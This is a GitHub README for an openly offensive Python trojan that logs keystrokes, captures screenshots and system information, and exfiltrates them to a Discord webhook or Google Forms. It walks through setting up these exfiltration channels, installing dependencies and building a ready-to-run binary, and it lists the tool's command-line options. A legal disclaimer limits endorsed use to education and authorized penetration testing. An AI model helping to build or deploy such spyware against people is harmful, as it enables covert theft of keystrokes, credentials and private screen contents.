# Python 3 Trojan

![Python Version](https://img.shields.io/badge/python-3.9+-blue?style=for-the-badge&logo=python)
[![CodeFactor Grade](https://img.shields.io/codefactor/grade/github/EONRaider/BCA-Trojan?label=CodeFactor&logo=codefactor&style=for-the-badge)](https://www.codefactor.io/repository/github/EONRaider/BCA-Trojan)
![OS](https://img.shields.io/badge/GNU%2FLinux-red?style=for-the-badge&logo=linux)
![OS](https://img.shields.io/badge/Windows-blue?style=for-the-badge&logo=windows)

[![Reddit](https://img.shields.io/badge/Reddit-EONRaider-FF4500?style=flat-square&logo=reddit)](https://www.reddit.com/user/eonraider)
[![Discord](https://img.shields.io/badge/Discord-EONRaider-7289DA?style=flat-square&logo=discord)](https://discord.gg/KVjWBptv)
[![Twitter](https://img.shields.io/badge/Twitter-eon__raider-38A1F3?style=flat-square&logo=twitter)](https://twitter.com/intent/follow?screen_name=eon_raider)

A **cross-platform Trojan** written in Python 3. Binaries for Linux and Windows 
platforms can be built through an embedded script that implements PyInstaller.

Captured data such as **keystrokes, screenshots and system information** are exfiltrated 
to a Discord server and/or Google Forms instance through HTTPS.

## Demo
![demo]()

## Setup and Build
Once the URLs for the Discord server's Webhook and/or Google Forms instance are 
ready you only need to (I) install the dependencies and (II) run `build.py` with 
the URLs as arguments.

### I. Set up a Discord server and/or Google Forms instance
You need at least one of the methods for successful exfiltration.
- **Discord:** Head over to https://www.discord.com and create a new Discord account and 
server, if necessary. [Create a Webhook URL](https://www.digitalocean.com/community/tutorials/how-to-use-discord-webhooks-to-get-notifications-for-your-website-status-on-ubuntu-18-04) 
for any suitable channel and copy the URL.

  ![webhook_Setup](https://github.com/EONRaider/static/blob/c4754c75475b223d02d75039f30e9846d4e92fc8/trojan/webhook_setup.png)

- **Google Forms:** Create a form on https://docs.google.com/forms (all you need is a 
Google account for that). Set up as many questions as you need, with any names. *The 
exfiltration will always work as long as the first question is of type **Paragraph**.*

  ![forms_setup](https://github.com/EONRaider/static/blob/c4754c75475b223d02d75039f30e9846d4e92fc8/trojan/forms_setup.png)

### II. Build the binary
Dependency management works with both [Poetry](https://python-poetry.org/) (recommended)
and [Virtualenv](https://virtualenv.pypa.io/en/latest/). *You need to install all 
dependencies before building*.
```shell
git clone https://github.com/EONRaider/BCA-Trojan.git
cd BCA-Trojan
poetry install <--or--> pip install -r requirements.txt
```

With all dependencies in place the `build.py` file takes care of the rest.
```shell
python build.py \
--webhook https://discord.com/api/webhooks/YOUR-WEBHOOK-ID
--forms https://docs.google.com/forms/d/e/YOUR-FORM-ID/viewform
```
The result is a binary file named `trojan` that is ready for execution.

## Usage
```
usage: trojan.py [-h] [-w <webhook_url>] [-f <google_forms_url>] [-e <seconds>]

BCA Trojan - Log keystrokes, takes screenshots, grab system information and exfiltrate to Discord and Google Forms

optional arguments:
  -h, --help            show this help message and exit
  -w <webhook_url>, --webhook <webhook_url>
                        URL of a Webhook for the Discord server.
  -f <google_forms_url>, --forms <google_forms_url>
                        URL of a remote instance of Google Forms.
  -e <seconds>, --exfil-time <seconds>
                        Time in seconds to wait between periodic executions of the exfiltration of logged data. Defaults to 30 seconds. Set to None to perform a single operation.
```

## Development mode (optional)
You could optionally run the Trojan directly from a local Python 3 interpreter. 
[Install all dependencies](https://github.com/EONRaider/BCA-Trojan/tree/master#i-install-dependencies) 
and run the `src/trojan.py` file with the required arguments for the Discord Webhook 
and/or Google Forms URLs.

```shell
python src/trojan.py --webhook YOUR-WEBHOOK-URL --forms YOUR-GOOGLE-FORMS-URL
```

## Legal Disclaimer

The use of code contained in this repository, either in part or in its totality,
for engaging targets without prior mutual consent is illegal. **It is
the end user's responsibility to obey all applicable local, state and
federal laws.**

Developers assume **no liability** and are not
responsible for misuses or damages caused by any code contained
in this repository in any event that, accidentally or otherwise, it comes to
be utilized by a threat agent or unauthorized entity as a means to compromise
the security, privacy, confidentiality, integrity, and/or availability of
systems and their associated resources. In this context the term "compromise" is
henceforth understood as the leverage of exploitation of known or unknown vulnerabilities
present in said systems, including, but not limited to, the implementation of
security controls, human- or electronically-enabled.

The use of this code is **only** endorsed by the developers in those
circumstances directly related to **educational environments** or
**authorized penetration testing engagements** whose declared purpose is that
of finding and mitigating vulnerabilities in systems, limiting their exposure
to compromises and exploits employed by malicious agents as defined in their
respective threat models.
